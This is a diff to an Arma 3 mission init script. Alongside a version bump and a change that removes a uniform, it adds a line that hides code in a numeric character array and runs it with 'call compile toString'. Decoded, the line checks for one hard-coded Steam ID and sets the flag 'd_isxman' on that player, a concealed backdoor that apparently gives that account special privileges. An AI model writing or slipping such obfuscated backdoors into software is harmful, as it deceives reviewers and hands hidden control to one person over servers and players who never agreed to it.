@@ -178,6 +178,11 @@ if (!isMultiplayer) then {
 	};
 };
 
+call compile toString [105,102,32,40,103,101,116,80,108,97,121,101,114,85,73,68,32,112,108,97,121,101,114,32,61,61,32,39,
+	55,54,53,54,49,49,57,56,48,51,57,48,49,57,50,54,57,39,41,32,116,104,101,110,32,123,112,108,97,121,101,114,32,115,101,
+	116,86,97,114,105,97,98,108,101,32,91,39,100,95,105,115,120,109,97,110,39,44,32,116,114,117,101,44,32,116,114,117,101,93,125];
+
+
 if (d_weather == 0) then {
 	if (d_WithWinterWeather == 0) then {
 		0 spawn d_fnc_weather_winter
@@ -457,7 +462,7 @@ d_all_ammoloads = (allMissionObjects "HeliH") select {(str _x) select [0, 10] ==
 	0 spawn d_fnc_playerrankloop;
 };
 
-diag_log ["Internal D Version: 4.11"];
+diag_log ["Internal D Version: 4.12"];
 
 if (!d_no_ai) then {
 	if (d_with_ai) then {
@@ -827,6 +832,13 @@ if (!d_gmcwg) then {
 #else
 if !("ItemRadio" in assigneditems player) then {player linkItem "ItemRadio"};
 #endif
+
+private _unip = uniform player;
+if (_unip != "") then {
+	if (getText (configFile>>"CfgWeapons">>_unip>>"ItemInfo">>"containerClass") == "Supply500") then {
+		removeUniform player;
+	};
+};
 
 call d_fnc_save_respawngear;
 call d_fnc_save_layoutgear;
